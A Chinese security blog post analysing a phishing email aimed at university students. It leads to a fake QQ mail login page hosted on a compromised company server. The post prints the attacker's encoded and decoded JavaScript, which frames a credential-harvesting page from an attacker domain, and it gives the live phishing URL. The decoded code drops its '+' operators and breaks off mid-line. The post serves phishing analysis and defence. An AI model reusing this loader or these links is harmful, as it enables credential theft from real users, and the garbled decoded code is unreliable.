<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  
  <title>
    分析并复现一次iframe框架钓鱼行为 | Leticia‘s Blog 
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <meta name="author" content="麻薯">



  <meta name="keywords" content=",渗透测试,XSS,网络钓鱼">
<meta name="description" content="0x00 前言事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， http://mrw.so/ 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。

0x01 尝试点击短链接跳转到了 ht">
<meta property="og:type" content="article">
<meta property="og:title" content="分析并复现一次iframe框架钓鱼行为 | Leticia‘s Blog">
<meta property="og:url" content="http://yoursite.com/2018/05/21/分析并复现一次iframe框架钓鱼行为/index.html">
<meta property="og:site_name" content="Leticia‘s Blog">
<meta property="og:description" content="0x00 前言事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， http://mrw.so/ 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。

0x01 尝试点击短链接跳转到了 ht">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing01.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing02.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing03.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing04.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing05.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing06.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing07.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing08.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing09.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing10.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11-1.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing12.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing13.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing14.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing15.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing16.png">
<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing17.png">
<meta property="og:updated_time" content="2018-05-22T07:40:33.373Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="分析并复现一次iframe框架钓鱼行为 | Leticia‘s Blog">
<meta name="twitter:description" content="0x00 前言事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， http://mrw.so/ 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。

0x01 尝试点击短链接跳转到了 ht">
<meta name="twitter:image" content="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing01.png">

  <!-- favicon icon files -->

  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
  <link rel="icon" href="/images/favicon.ico">

  <!-- css files -->
  <link rel="stylesheet" href="/css/font-awesome.min.css">
  <link rel="stylesheet" href="/css/uno.css">
  <link rel="stylesheet" href="/css/tagscloud.css">
  <link rel="stylesheet" href="/css/links.css">
  <link rel="stylesheet" href="/css/archive.css">
  <link rel="stylesheet" href="/css/jquery.fancybox.css">
  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
</head>
<body>
  <!-- mobile menu -->
  <span class="mobile btn-mobile-menu">
    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
  </span>
  <!-- side panel -->
  
  <header class="panel-cover panel-cover--collapsed">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">
      
        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
      
        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
        <hr class="panel-cover__divider" />
        
        <p class="panel-cover__description">
          She will never see the day it blossoms,maybe.
        </p>
        <hr class="panel-cover__divider" />
        
        <!-- TagsCloud -->
        

  <div id="tagscloud">
<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 30</a><a href="/tags/笔记/" class="tagc2">笔记 : 13</a><a href="/tags/python/" class="tagc3">python : 11</a><a href="/tags/php/" class="tagc4">php : 9</a><a href="/tags/mysql/" class="tagc5">mysql : 7</a><a href="/tags/网络安全/" class="tagc1">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc2">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc3">暴力破解 : 4</a><a href="/tags/ctf/" class="tagc4">ctf : 3</a><a href="/tags/文件上传/" class="tagc5">文件上传 : 3</a><a href="/tags/机器学习/" class="tagc1">机器学习 : 3</a><a href="/tags/逻辑处理漏洞/" class="tagc2">逻辑处理漏洞 : 2</a><a href="/tags/XSS/" class="tagc3">XSS : 2</a><a href="/tags/内网渗透/" class="tagc4">内网渗透 : 2</a><a href="/tags/shell/" class="tagc5">shell : 2</a><a href="/tags/密码学/" class="tagc1">密码学 : 2</a><a href="/tags/硬件安全/" class="tagc2">硬件安全 : 2</a><a href="/tags/代码审计/" class="tagc3">代码审计 : 2</a><a href="/tags/snort/" class="tagc4">snort : 1</a><a href="/tags/网络协议/" class="tagc5">网络协议 : 1</a>
</div>

        <div class="navigation-wrapper">
          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
            
              
              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
            
              
              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
            
              
              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
            
            </ul>
          </nav>
          
<hr class="panel-cover__divider">
<nav class="cover-navigation navigation--social">
  <ul class="navigation">
    
      <!-- Github -->
      <li class="navigation__item">
        <a href="https://github.com/echohun" title="麻薯's GitHub">
          <i class='fa fa-github'></i>
          <span class="label">GitHub</span>
        </a>
      </li>
    
    
    
  </ul>
</nav>

        </div>
      </div>
    </div>
    <div class="panel-cover--overlay"></div>
  </div>
</header>
  <div class="content-wrapper">
    <div class="content-wrapper__inner entry">
      <!-- body panel -->
      
<article class="post-container post-container--single">
  <header class="post-header">
    <h1 class="post-title">分析并复现一次iframe框架钓鱼行为</h1>
    
    <div class="post-meta">
      <time datetime="2018-05-21 20:55:29" class="post-meta__date date">2018-05-21 20:55:29</time> 
      <span class="post-meta__tags tags">
      
        <font class="categories">&#8226; 分类:
        <a class="categories-link" href="/categories/渗透测试/">渗透测试</a>
        </font>
      
      
        &#8226; 标签:
        <font class="tags">
        <a class="tags-link" href="/tags/XSS/">XSS</a>, <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>, <a class="tags-link" href="/tags/网络钓鱼/">网络钓鱼</a>
        </font>
      
      </span>
    </div>
    
  </header>
  <section id="post-content" class="article-content post">
  <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， <a href="http://mrw.so/" target="_blank" rel="external">http://mrw.so/</a> 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing01.png" alt=""></p>
<h2 id="0x01-尝试"><a href="#0x01-尝试" class="headerlink" title="0x01 尝试"></a>0x01 尝试</h2><p>点击短链接跳转到了 <a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="external">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a><br> 并且在加载出来之前一直显示一个很刻意的“链接中”，并且url有好长的路径，看样子像是哪个公司的服务器被钓鱼作者放了点东西，直接访问了下 <a href="http://www.topaone.com" target="_blank" rel="external">http://www.topaone.com</a> 发现果然是一个叫京品设计的公司。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing02.png" alt=""></p>
<p>加载出来之后是一个qq邮箱的登陆解面，不过做的很不走心，网页title都没写qq邮箱，title旁边的ico也是qq空间而不是qq邮箱的ico，登陆框除了账号密码两个输入框和登陆按钮以外都是不可点击状态。随便填一个账号密码弹窗提示密码错误，而且返回信息的网址应该是钓鱼作者的服务器。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing03.png" alt=""></p>
<p>还有一点是在进入这个链接的时候，即使已经到了邮箱登陆页面，浏览器仍然一直处于加载状态，以之前自己写钓鱼网站的经验来猜测，对方应该使用了window.onload配合document.write来覆盖整个页面，所以每次加载完都会重触发一次window.onload，无限循环。</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>见识了一下大致的访问过程，该抓包看看具体是怎么个流程了，在burpsuite中截取数据包，发现访问到的页面返回了一堆编码过的js代码。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing04.png" alt=""></p>
<p>初步判断这个钓鱼作者在京品设计公司的服务器上面挂了一个存储型xss。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml"></span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">document.write(unescape("%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253C%2521--%2523Include%2520File%253D%2522SqlIn.Asp%2522--%253E%250D%250A%253Chtml%253E%250D%250A%253Chead%253E%250D%250A%253Cmeta%2520http-equiv%253D%2522Content-Language%2522%2520content%253D%2522zh-cn%2522%253E%250D%250A%253Cmeta%2520HTTP-EQUIV%253D%2522Content-Type%2522%2520CONTENT%253D%2522text/html%253B%2520charset%253Dgb2312%2522%253E%250D%250A%253Ctitle%253Eukkifddssfggg---kuasa......%253C/title%253E%250D%250A%253Cmeta%2520name%253D%2522description%2522%2520content%253D%2522%2522%253E%250D%250A%253Clink%2520href%253D%2522index_files/88.css%253Fmax_age%253D31536000%2526d%253D1333188324128%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%253Clink%2520href%253D%2522index_files/home_fixed.css%253Fmax_age%253D31536000%2526d%253D1334659684120%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%250D%250A%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%250D%250A%253Cstyle%2520id%253D%2522mainJSBg%2522%2520type%253D%2522text/css%2522%253E%250D%250A.lay_background%257Bbackground-repeat%253Ano-repeat%253Bbackground-position%253Acenter%2520top%253Bbackground-attachment%253Ascroll%253Bbackground-image%253Aurl%252864538_top.jpg%2529%253B%257D%250D%250Abody%257Bbackground-image%253Aurl%252864538_bg.jpg%2529%253B%2520background-repeat%253Arepeat%253B%257D%253C/style%253E%250D%250A%250D%250A%250D%250A%253Cstyle%2520type%253D%2522text/css%2522%2520id%253D%2522dynamicStyle%2522%253E%250D%250A.ownermode%257Bdisplay%253Anone%253B%257D%250D%250A.clientmode%257Bdisplay%253A%253B%257D%250D%250A.editmode%257Bdisplay%253Anone%253B%257D%250D%250A.customoff%257Bdisplay%253A%253B%257D%250D%250A.alphamode%257Bdisplay%253Anone%253B%257D%250D%250A%253C/style%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253C/style%253E%250D%250A%253Clink%2520rel%253D%2522Shortcut%2520Icon%2522%2520href%253D%2522http%253A//ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%253E%250D%250A%253C/head%253E%250D%250A%253Cbody%2520id%253D%2522QZ_Body%2522%2520class%253D%2522bg_body%2520%2520%2522%253E%250D%250A%250D%250A%253Cdiv%2520id%253D%2522welcomeflash%2522%2520style%253D%2522position%253Afixed%253B_position%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bbackground-color%253Awhite%253Btext-align%253Acenter%253Bwidth%253A100%2525%253Bz-index%253A30000%253Bheight%253A10000px%253B%2522%2520onClick%253D%2522wSwf_obj_swf.call%2528this%2529%2522%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bposition%253Aabsolute%253Bleft%253A0%253Btop%253A0%253Bbackground%253Awhite%253Bheight%253A100%2525%253B%2522%253E%250D%250A%250D%250A%253C%25u94FE%25u63A5%25u4E2D%25B7%25B7%25B7%25B7%25B7%253E%250D%250A%250D%250A%253C/div%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bcursor%253Apointer%253Bposition%253Aabsolute%253Bleft%253A0px%253Bbackground%253Aurl%2528about%253Ablank%2529%253Bopacity%253A0%253Bz-index%253A30001%253Btop%253A0px%253Bheight%253A100%2525%2522%253E%253C/div%253E%253C/div%253E%250D%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250D%250A%2528function%2528%2529%2520%257B%250D%250A%2509var%2520wel%253Ddocument.getElementById%2528%2527welcomeflash%2527%2529%252Ctimer%252Cch%252C_s%253Dnew%2520Function%253B%250D%250A%2509window.wSwf_obj_swf%2520%253D%2520window.wSwf_obj_swf_s%253Dfunction%2528%2529%2520%257B%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522%2522%253B%250D%250A%2509%2509wel%2520%2526%2526%2520%2528wel.innerHTML%2520%253D%2520%2527%2527%2529%253B%250D%250A%2509%2509wel%2520%2526%2526%2520document.body.removeChild%2528wel%2529%253B%250D%250A%2509%2509window.removeEventListener%253Fwindow.removeEventListener%2528%2527resize%2527%252C_s%2529%253A%2528window.detachEvent%2526%2526window.detachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%2509clearTimeout%2528timer%2529%253B%250D%250A%2509%257D%253B%250D%250A%2509timer%2520%253D%2520setTimeout%2528wSwf_obj_swf%252C%25204000%2529%253B%250D%250A%2509if%2520%2528wel%2529%2520%257B%250D%250A%2509%2509_s%253Dfunction%2528%2529%257B%250D%250A%2509%2509%2509ch%253Ddocument.documentElement.clientHeight%253B%250D%250A%2509%2509%2509wel.children%255B0%255D.style.paddingTop%2520%253D%2520Math.floor%2528Math.max%25280%252Cch%2520-%2520590%2529%2520/%25202%2529+%2527px%2527%253B%250D%250A%2509%2509%257D%253B%250D%250A%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522hidden%2522%253B%250D%250A%2509%2509_s%2528%2529%253B%250D%250A%2509%2509window.addEventListener%253Fwindow.addEventListener%2528%2527resize%2527%252C_s%252Cfalse%2529%253A%2528window.attachEvent%2526%2526window.attachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%257D%250D%250A%257D%2529%2528%2529%253B%250D%250A%253C/script%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%250D%250A%253Ciframe%2520id%253D%2522iframe%2522%2520%2520%2520height%253D%2522100%2525%2522%2520width%253D%2522100%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%250D%250A%2520%2520%253Cscript%2520%2520%2520language%253D%2522javascript%2522%253E%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520var%2520pos%252Cstr%252Cpara%252Curl%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520str%2520%253D%2520window.location.href%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520pos%2520%253D%2520str.indexOf%2528%2522%253F%2522%2529%2520%2520%253B%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520url%2520%253D%2520str.substring%2528pos+1%2529%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528pos%253E0%2529%257B%2520%2520%250D%250A%2509%2509%2509%2509n%253D%2527http%253A//ujhgdgjalkfja2.tk/%2527%253B%250D%250A%2509%2509%2509%2509j1%253Dn+url%253B%250D%250A%2509%2509%2509%2509c%253D%2527%253Clink%2520rel%253D%2522shortcut%2520icon%2522%2520href%253D%2522https%253A//s.tbcdn.cn/apps/login/static/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%2520/%253E%2527%253B%250D%250A%2509%2509%2509%2509b%253D%2527%253Chtml%253E%253Chead%253E%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%2527%253B%250D%250A%2509%2509%2509%2509a%253D%2527%253Ciframe%2520name%253D%2522main%2522%2520%2520height%253D%2522100%2525%2522%2520src%253D%2522%2527%253B%250D%250A%2509%2509%2509%2509k1%253D%2527%2522%2520width%253D%2522101%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%2527%253B%250D%250A%2520%2509%2509%2509%2509var%2520%2520d%2520%253D%2520%2520window.frames%255B0%255D%253B%250D%250A%2520%2520%2509%2509%2509%2509d.document.write%2528c+b+a+j1+k1%2529%253B%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520else%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%253C/script%253E%250D%250A%2520%2520%250D%250A%250D%250A%253Chead%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E"));</div><div class="line">//--&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这个钓鱼网站作者没有对代码做什么加密，明显只是多次编码过的js代码，直接url解码两次，得到清晰的js代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml"></span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">document.write(unescape("&lt;script&gt;</div><div class="line">&lt;!--</div><div class="line">document.write(unescape("&lt;!--#Include File="SqlIn.Asp"--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Language"</span> <span class="attr">content</span>=<span class="string">"zh-cn"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Content-Type"</span> <span class="attr">CONTENT</span>=<span class="string">"text/html; charset=gb2312"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>ukkifddssfggg---kuasa......<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/88.css?max_age=31536000&amp;d=1333188324128"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/home_fixed.css?max_age=31536000&amp;d=1334659684120"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></div><div class="line"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">"mainJSBg"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></div><div class="line">.lay_background&#123;background-repeat:no-repeat;background-position:center top;background-attachment:scroll;background-image:url(64538_top.jpg);&#125;</div><div class="line">body&#123;background-image:url(64538_bg.jpg); background-repeat:repeat;&#125;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">id</span>=<span class="string">"dynamicStyle"</span>&gt;</span><span class="undefined"></span></div><div class="line">.ownermode&#123;display:none;&#125;</div><div class="line">.clientmode&#123;display:;&#125;</div><div class="line">.editmode&#123;display:none;&#125;</div><div class="line">.customoff&#123;display:;&#125;</div><div class="line">.alphamode&#123;display:none;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"Shortcut Icon"</span> <span class="attr">href</span>=<span class="string">"http://ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"QZ_Body"</span> <span class="attr">class</span>=<span class="string">"bg_body  "</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"welcomeflash"</span> <span class="attr">style</span>=<span class="string">"position:fixed;_position:absolute;top:0;left:0;background-color:white;text-align:center;width:100%;z-index:30000;height:10000px;"</span> <span class="attr">onClick</span>=<span class="string">"wSwf_obj_swf.call(this)"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;position:absolute;left:0;top:0;background:white;height:100%;"</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">链接中?????</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;cursor:pointer;position:absolute;left:0px;background:url(about:blank);opacity:0;z-index:30001;top:0px;height:100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line">(function() &#123;</div><div class="line">	var wel=document.getElementById('welcomeflash'),timer,ch,_s=new Function;</div><div class="line">	window.wSwf_obj_swf = window.wSwf_obj_swf_s=function() &#123;</div><div class="line">		document.documentElement.style.overflow = "";</div><div class="line">		wel &amp;&amp; (wel.innerHTML = '');</div><div class="line">		wel &amp;&amp; document.body.removeChild(wel);</div><div class="line">		window.removeEventListener?window.removeEventListener('resize',_s):(window.detachEvent&amp;&amp;window.detachEvent('onresize',_s));</div><div class="line">		clearTimeout(timer);</div><div class="line">	&#125;;</div><div class="line">	timer = setTimeout(wSwf_obj_swf, 4000);</div><div class="line">	if (wel) &#123;</div><div class="line">		_s=function()&#123;</div><div class="line">			ch=document.documentElement.clientHeight;</div><div class="line">			wel.children[0].style.paddingTop = Math.floor(Math.max(0,ch - 590) / 2) 'px';</div><div class="line">		&#125;;</div><div class="line"></div><div class="line">		document.documentElement.style.overflow = "hidden";</div><div class="line">		_s();</div><div class="line">		window.addEventListener?window.addEventListener('resize',_s,false):(window.attachEvent&amp;&amp;window.attachEvent('onresize',_s));</div><div class="line">	&#125;</div><div class="line">&#125;)();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="xml">   </span></div><div class="line">               var pos,str,para,url;  </div><div class="line">                str = window.location.href;  </div><div class="line">                pos = str.indexOf("?")  ;</div><div class="line">                url = str.substring(pos 1);  </div><div class="line">                if (pos&gt;0)&#123;  </div><div class="line">				n='http://ujhgdgjalkfja2.tk/';</div><div class="line">				j1=n 